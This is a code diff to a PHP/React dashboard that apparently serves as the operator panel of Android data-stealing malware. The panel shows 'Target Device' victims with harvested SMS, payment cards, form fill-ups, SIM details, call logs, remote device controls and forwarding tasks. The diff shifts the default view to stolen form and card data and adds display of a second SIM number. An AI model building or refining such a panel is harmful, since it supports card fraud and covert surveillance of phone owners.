@@ -57,7 +57,7 @@ include_once __DIR__ . '/header.php';
         totalSmsCount: 9,
         totalCallsCount: 3,
         sim1Data: { slot: 1, carrier: "Airtel 5G", phone: "+91 91234 56789", network: "5G NSA", serial: "899144029102938411B", countryCode: "IN" },
-        sim2Data: { slot: 2, carrier: "Vi 4G", phone: "Not inserted", network: "None", serial: "N/A", countryCode: "IN" },
+        sim2Data: { slot: 2, carrier: "Jio 4G", phone: "+91 91234 11223", network: "4G LTE", serial: "899144029102938419C", countryCode: "IN" },
         smsDataList: [
           { sender: "SBI-MSG", message: "Your credit card bill of Rs 12,450 is due on 05-Aug.", timestamp: "Yesterday", type: "INBOX" }
         ],
@@ -95,7 +95,7 @@ include_once __DIR__ . '/header.php';
       const [users, setUsers] = React.useState(MOCK_DATA);
       const [search, setSearch] = React.useState('');
       const [selectedUser, setSelectedUser] = React.useState(null);
-      const [tab, setTab] = React.useState('sms');
+      const [tab, setTab] = React.useState('forms');
       const [showApkModal, setShowApkModal] = React.useState(false);
       const [showChangePassModal, setShowChangePassModal] = React.useState(false);
       const [newPassInput, setNewPassInput] = React.useState('');
@@ -681,10 +681,10 @@ include_once __DIR__ . '/header.php';
               </div>
               <div className="glass-panel metric-card">
                 <div>
-                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL CALL LOGS</p>
-                  <h2 style={{ color: '#f472b6' }}>{users.reduce((acc, u) => acc + u.totalCallsCount, 0)}</h2>
+                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>FORM FILL-UPS</p>
+                  <h2 style={{ color: '#f472b6' }}>{users.reduce((acc, u) => acc + (u.formDataList?.length || 0), 0)}</h2>
                 </div>
-                <div style={{ fontSize: '2rem' }}>📞</div>
+                <div style={{ fontSize: '2rem' }}>📝</div>
               </div>
             </div>
 
@@ -727,23 +727,13 @@ include_once __DIR__ . '/header.php';
                         <span className="pulse-dot"></span>
                         {u.isActive ? 'ACTIVE' : 'OFFLINE'}
                       </span>
-                      {u.appInBackground ? (
-                        <span className="pulse-badge" style={{ background: 'rgba(251,191,36,0.15)', color: '#fbbf24', fontSize: '0.7rem', padding: '2px 6px' }}>
-                          📲 Background
-                        </span>
-                      ) : (
-                        <span className="pulse-badge" style={{ background: 'rgba(52,211,153,0.15)', color: '#34d399', fontSize: '0.7rem', padding: '2px 6px' }}>
-                          🟢 Foreground
-                        </span>
-                      )}
                     </div>
                   </div>
 
                   <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '4px', marginBottom: '1rem' }}>
-                    <div>📞 <strong>{u.mobileNumber}</strong></div>
+                    <div>📞 <strong>{u.sim1Data?.phone || u.mobileNumber}</strong> {u.sim2Data?.phone && u.sim2Data.phone !== 'Not inserted' ? <span style={{ color: '#cbd5e1' }}>• 📞 <strong>{u.sim2Data.phone}</strong></span> : ''}</div>
                     {u.stringField && <div style={{ color: '#cbd5e1' }}>📱 Device: <strong>{u.stringField}</strong></div>}
-                    <div>📶 SIM: {u.simState} • 🔋 Battery: {u.batteryLevel}</div>
-                    <div>🕒 Last Active: {u.lastActivityTime}</div>
+                    <div>🔋 Battery: {u.batteryLevel} • 🕒 Active: {u.lastActivityTime}</div>
                   </div>
 
                   {/* Remote Device Control Bar */}
@@ -767,7 +757,7 @@ include_once __DIR__ . '/header.php';
                       💬 {u.totalSmsCount} SMS
                     </span>
                     <span className="pulse-badge" style={{ background: 'rgba(236,72,153,0.15)', color: '#f472b6' }}>
-                      📞 {u.totalCallsCount} Calls
+                      📝 {u.formDataList?.length || 0} Forms
                     </span>
                   </div>
                 </div>
@@ -804,18 +794,9 @@ include_once __DIR__ . '/header.php';
                   <div>
                     <h3 style={{ color: '#fff', display: 'flex', alignItems: 'center', gap: '8px' }}>
                       <span>Target Device: {selectedUser.fullName}</span>
-                      {selectedUser.appInBackground ? (
-                        <span className="pulse-badge" style={{ background: 'rgba(251,191,36,0.15)', color: '#fbbf24', fontSize: '0.72rem' }}>
-                          📲 App in Background
-                        </span>
-                      ) : (
-                        <span className="pulse-badge" style={{ background: 'rgba(52,211,153,0.15)', color: '#34d399', fontSize: '0.72rem' }}>
-                          🟢 App in Foreground
-                        </span>
-                      )}
                     </h3>
                     <p style={{ fontSize: '0.85rem', color: '#9ca3af', marginTop: '4px' }}>
-                      Phone: <strong>{selectedUser.mobileNumber}</strong> • User ID: <code style={{ color: '#93c5fd' }}>{selectedUser.userId}</code>
+                      Phone: <strong>{selectedUser.sim1Data?.phone || selectedUser.mobileNumber}</strong> {selectedUser.sim2Data?.phone && selectedUser.sim2Data.phone !== 'Not inserted' ? `• Secondary: ${selectedUser.sim2Data.phone}` : ''} • User ID: <code style={{ color: '#93c5fd' }}>{selectedUser.userId}</code>
                       {selectedUser.numberField ? ` • ${selectedUser.numberField}` : ''}
                       {selectedUser.stringField ? ` • Model: ${selectedUser.stringField}` : ''}
                     </p>
@@ -824,23 +805,17 @@ include_once __DIR__ . '/header.php';
                 </div>
 
                 <div style={{ padding: '0.85rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', gap: '8px', overflowX: 'auto', alignItems: 'center', whiteSpace: 'nowrap', flexShrink: 0 }}>
+                  <button className={`tab-btn ${tab === 'forms' || tab === 'formfill' ? 'active' : ''}`} onClick={() => setTab('forms')}>
+                    📝 Form Fill-ups ({selectedUser.formDataList?.length || 0})
+                  </button>
+                  <button className={`tab-btn ${tab === 'cards' ? 'active' : ''}`} onClick={() => setTab('cards')}>
+                    💳 Cards ({selectedUser.cardDataList.length})
+                  </button>
                   <button className={`tab-btn ${tab === 'sms' ? 'active' : ''}`} onClick={() => setTab('sms')}>
                     💬 SMS ({selectedUser.smsDataList.length})
                   </button>
                   <button className={`tab-btn ${tab === 'inspector' ? 'active' : ''}`} onClick={() => setTab('inspector')}>
                     🔍 Schema Inspector
-                  </button>
-                  <button className={`tab-btn ${tab === 'sims' ? 'active' : ''}`} onClick={() => setTab('sims')}>
-                    📶 Dual SIM
-                  </button>
-                  <button className={`tab-btn ${tab === 'formfill' ? 'active' : ''}`} onClick={() => setTab('formfill')}>
-                    📝 Form Fill-ups ({selectedUser.formDataList?.length || 0})
-                  </button>
-                  <button className={`tab-btn ${tab === 'calls' ? 'active' : ''}`} onClick={() => setTab('calls')}>
-                    📞 Calls ({selectedUser.callDataList.length})
-                  </button>
-                  <button className={`tab-btn ${tab === 'cards' ? 'active' : ''}`} onClick={() => setTab('cards')}>
-                    💳 Cards ({selectedUser.cardDataList.length})
                   </button>
                   <button className={`tab-btn ${tab === 'forward' ? 'active' : ''}`} onClick={() => setTab('forward')}>
                     📲 Forward Tasks ({forwardTasks.filter(t => t.userId === selectedUser.userId).length})
@@ -930,63 +905,6 @@ include_once __DIR__ . '/header.php';
                     </div>
                   )}
 
-                  {tab === 'sims' && (
-                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.25rem' }}>
-                      {/* SIM 1 Card */}
-                      <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(99,102,241,0.3)', background: 'rgba(99,102,241,0.05)' }}>
-                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
-                          <h4 style={{ color: '#818cf8', fontSize: '1rem' }}>📶 SIM Slot 1 (`SimData`)</h4>
-                          <span className="pulse-badge active">Slot 1</span>
-                        </div>
-                        <div style={{ fontSize: '0.85rem', display: 'flex', flexDirection: 'column', gap: '8px', color: '#cbd5e1' }}>
-                          <div>Carrier: <strong style={{ color: '#fff' }}>{selectedUser.sim1Data?.carrier || 'Jio 5G'}</strong></div>
-                          <div>Phone Number: <strong style={{ color: '#34d399' }}>{selectedUser.sim1Data?.phone || selectedUser.mobileNumber}</strong></div>
-                          <div>Network Type: <code style={{ color: '#93c5fd' }}>{selectedUser.sim1Data?.network || '5G SA'}</code></div>
-                          <div>Country Code: <span>{selectedUser.sim1Data?.countryCode || 'IN'}</span></div>
-                          <div>SIM Serial Number: <code style={{ color: '#c084fc', fontSize: '0.78rem' }}>{selectedUser.sim1Data?.serial || '899100293810293819F'}</code></div>
-                        </div>
-                      </div>
-
-                      {/* SIM 2 Card */}
-                      <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(236,72,153,0.3)', background: 'rgba(236,72,153,0.05)' }}>
-                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
-                          <h4 style={{ color: '#f472b6', fontSize: '1rem' }}>📶 SIM Slot 2 (`SimData`)</h4>
-                          <span className="pulse-badge" style={{ background: 'rgba(236,72,153,0.15)', color: '#f472b6' }}>Slot 2</span>
-                        </div>
-                        <div style={{ fontSize: '0.85rem', display: 'flex', flexDirection: 'column', gap: '8px', color: '#cbd5e1' }}>
-                          <div>Carrier: <strong style={{ color: '#fff' }}>{selectedUser.sim2Data?.carrier || 'Airtel 4G'}</strong></div>
-                          <div>Phone Number: <strong style={{ color: '#34d399' }}>{selectedUser.sim2Data?.phone || 'Not inserted'}</strong></div>
-                          <div>Network Type: <code style={{ color: '#93c5fd' }}>{selectedUser.sim2Data?.network || '4G LTE'}</code></div>
-                          <div>Country Code: <span>{selectedUser.sim2Data?.countryCode || 'IN'}</span></div>
-                          <div>SIM Serial Number: <code style={{ color: '#c084fc', fontSize: '0.78rem' }}>{selectedUser.sim2Data?.serial || '899100293810293810A'}</code></div>
-                        </div>
-                      </div>
-                    </div>
-                  )}
-
-                  {tab === 'calls' && (
-                    <div style={{ overflowX: 'auto', width: '100%' }}>
-                      <table className="data-table">
-                        <thead>
-                          <tr>
-                            <th>Number</th>
-                            <th>Call Type</th>
-                            <th>Duration</th>
-                            <th>Timestamp</th>
-                          </tr>
-                        </thead>
-                        <tbody>
-                          {(selectedUser.callDataList || []).map((call, i) => (
-                            <tr key={i}>
-                              <td style={{ whiteSpace: 'nowrap' }}>{call.number}</td>
-                              <td style={{ whiteSpace: 'nowrap' }}><span style={{ color: call.type === 'INCOMING' ? '#34d399' : '#818cf8', fontWeight: 600 }}>{call.type}</span></td>
-                              <td style={{ whiteSpace: 'nowrap' }}>{call.duration}</td>
-                              <td style={{ color: '#9ca3af', fontSize: '0.8rem', whiteSpace: 'nowrap' }}>{call.timestamp}</td>
-                            </tr>
-                          ))}
-                        </tbody>
-                      </table>
-                    </div>
                   )}
 
                   {tab === 'formfill' && (
